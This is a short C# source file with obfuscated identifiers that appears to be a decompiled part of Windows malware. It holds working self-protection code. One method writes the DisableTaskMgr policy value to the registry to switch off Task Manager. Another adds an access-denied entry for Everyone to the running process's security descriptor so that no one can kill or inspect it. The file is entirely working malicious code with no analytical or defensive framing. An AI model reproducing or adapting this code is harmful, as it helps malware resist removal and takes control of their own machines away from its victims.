using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace JcxFVLIspytryi;

internal class MJvlipExeMOGrY
{
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr wcHfRNsxdXaSOd, int TtvtZaurkQfpzR, [Out] byte[] PNNPZzFMdcWNG, uint BFdTaxrpGCs, out uint uihgnBTglonVg);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr UXanOaNnwZLBdDP, int gzzhkKgBsXOFu, [In] byte[] RsxkcHJIXpmVYUHJ);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void viGeMcRDDySYi(bool xnvLsuyGexqWJEe)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			if (xnvLsuyGexqWJEe && registryKey.GetValue("DisableTaskMgr") != null)
			{
				registryKey.DeleteValue("DisableTaskMgr");
			}
			else
			{
				registryKey.SetValue("DisableTaskMgr", "1");
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor fHUBzydQeihjn(IntPtr aWFFLtDEfcCTBWQ)
	{
		byte[] pNNPZzFMdcWNG = new byte[0];
		GetKernelObjectSecurity(aWFFLtDEfcCTBWQ, 4, pNNPZzFMdcWNG, 0u, out var uihgnBTglonVg);
		if ((long)uihgnBTglonVg > 32767L)
		{
			throw new Win32Exception();
		}
		if (!GetKernelObjectSecurity(aWFFLtDEfcCTBWQ, 4, pNNPZzFMdcWNG = new byte[uihgnBTglonVg], uihgnBTglonVg, out uihgnBTglonVg))
		{
			throw new Win32Exception();
		}
		return new RawSecurityDescriptor(pNNPZzFMdcWNG, 0);
	}

	private void aTiDzFAHmD(IntPtr ewfwYlwPkpR, RawSecurityDescriptor oXieGOTZHnSNr)
	{
		byte[] array = new byte[oXieGOTZHnSNr.BinaryLength];
		oXieGOTZHnSNr.GetBinaryForm(array, 0);
		if (!SetKernelObjectSecurity(ewfwYlwPkpR, 4, array))
		{
			throw new Win32Exception();
		}
	}

	public void iEerdmlWYDYWH()
	{
		IntPtr currentProcess = GetCurrentProcess();
		RawSecurityDescriptor rawSecurityDescriptor = fHUBzydQeihjn(currentProcess);
		rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
		aTiDzFAHmD(currentProcess, rawSecurityDescriptor);
	}
}
